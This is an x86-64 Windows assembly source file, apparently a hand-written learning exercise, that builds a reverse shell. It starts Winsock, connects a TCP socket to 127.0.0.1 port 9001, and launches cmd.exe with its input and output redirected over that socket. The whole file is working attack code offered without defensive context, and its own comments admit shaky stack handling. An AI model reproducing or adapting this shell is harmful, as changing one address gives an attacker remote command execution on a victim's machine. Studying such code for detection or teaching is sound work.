;https://github.com/brechtsanders/winlibs_mingw/releases/download/14.2.0posix-19.1.1-12.0.0-ucrt-r2/winlibs-x86_64-posix-seh-gcc-14.2.0-llvm-19.1.1-mingw-w64ucrt-12.0.0-r2.zip
;ld -m i386pep -LC:\mingw64\x86_64-w64-mingw32\lib asmsock.obj -o asmsock.exe -lws2_32 -lkernel32

BITS 64
section .text
global main

extern WSAStartup
extern WSASocketA
extern WSAConnect
extern CreateProcessA
extern ExitProcess

main:
    ; Call WSAStartup
	and rsp, 0xFFFFFFFFFFFFFFF0
    xor rcx, rcx
    mov cx, 0x198
    sub rsp, rcx                ; Reserve space for lpWSDATA structure
    lea rdx, [rsp]              ; Assign address of lpWSAData to RDX - 2nd param
    mov cx, 0x202               ; Assign 0x202 to wVersionRequired as 1st parameter
    sub rsp, 0x28    
    call WSAStartup
    add rsp, 0x30
	
    ; Create a socket 
    xor rcx, rcx           
    mov cl, 2                   ; AF = 2 - 1st param
    xor rdx, rdx          
    mov dl, 1                   ; Type = 1 - 2nd param
    xor r8, r8              
    mov r8b, 6                  ; Protocol = 6 - 3rd param
    xor r9, r9                  ; lpProtocolInfo = 0 - fourth param
    mov [rsp+0x20], r9          ; 0 = 5th param
    mov [rsp+0x28], r9          ; 0 = 6th param
    call WSASocketA             ; Call WSASocketA 
    mov r12, rax                ; Save the returned socket value
    add rsp, 0x30          
         
    ; Initiate Socket Connection
    mov r13, rax                ; Store SOCKET handle in r13 for future needs
    mov rcx, r13                ; Our socket handle as parameter 1
    xor rax,rax                 ;
    inc rax                     ;
    inc rax                     ;
    mov [rsp], rax              ; AF_INET = 2
    mov rax, 0x2923             ; Port 9001
    mov [rsp+2], rax            ; our Port
    mov rax, 0x0100007F         ; IP 127.0.0.1 (I use virtual box with port forwarding, hence the localhost addr)
    mov [rsp+4], rax            ; our IP
    lea rdx,[rsp]               ; Save pointer to RDX
    mov r8, 0x16                ; Move 0x10 (decimal 16) to namelen
    xor r9,r9             
    push r9                     ; NULL
    push r9                     ; NULL 
    push r9                     ; NULL 
	add rsp, 8
    sub rsp, 0x90               ; This is somewhat problematic. needs to be a high value to account for the stack or so it seems
    call WSAConnect             ; Call WSAConnect
    add rsp, 0x30
    mov rax, 0x6578652e646d63   ; Push cmd.exe string to stack
    push rax                      
    mov rcx, rsp                ; RCX = lpApplicationName (cmd.exe)
 
    ; STARTUPINFOA Structure (I despise this thing)
	; https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    push r13                    ; Push STDERROR
    push r13                    ; Push STDOUTPUT
    push r13                    ; Push STDINPUT
    xor rax,rax
    push rax                    ; 8 bytes -> push lpReserved2
    push rax                    ; 8 bytes -> combine cbReserved2 and wShowWindow
    push ax                     ; dwFlags 4 bytes total, first 2 bytes
    mov rax, 0x100              ; STARTF_USESTDHANDLES
    push ax                     ; continuation of the above, last 2 bytes for dwFlags
    xor rax,rax  
    push rax                    ; dwFillAttribute (4 bytes) + dwYCountChars (4 bytes)
    push rax                    ; dwXCountChars (4 bytes) + dwYSize (4 bytes)
    push rax                    ; dwXSize (4 bytes) + dwY (4 bytes)
    push ax                     ; dwX 4 bytes total, first 2 bytes
	push ax                     ; dwX last 2 bytes
	push rax                    ; 8 bytes -> lpTitle
    push rax                    ; 8 bytes -> lpDesktop = NULL
    push rax                    ; 8 bytes -> lpReserved = NULL
    mov rax, 0x68               ; total size of structure
    push rax                    
    mov rdi,rsp                 ; Copy the pointer to the structure to RDI

    ; Call CreateProcessA
    mov rax, rsp                ; Get current stack pointer
    sub rax, 0x500              ; Setup space on the stack for holding process info
    push rax                    ; ProcessInfo
    push rdi                    ; StartupInfo -> Pointer to STARTUPINFOA
    xor rax, rax
    push rax                    ; lpCurrentDirectory
    push rax                    ; lpEnvironment
    push rax                   
    inc rax
    push rax                    ; bInheritHandles -> 1
    xor rax, rax
    push rax                    ; hStdInput = NULL
    push rax                    ; hStdOutput = NULL
    push rax                    ; hStdError = NULL
    push rax                    ; dwCreationFlags
    mov r8, rax                 ; lpThreadAttributes            
    mov r9, rax                 ; lpProcessAttributes           
    mov rdx, rcx                ; lpCommandLine = "cmd.exe" 
    mov rcx, rax                ; lpApplicationName              
    call CreateProcessA         ; Call CreateProcessA

    ; Clean exit
    mov rcx, 0
    call ExitProcess
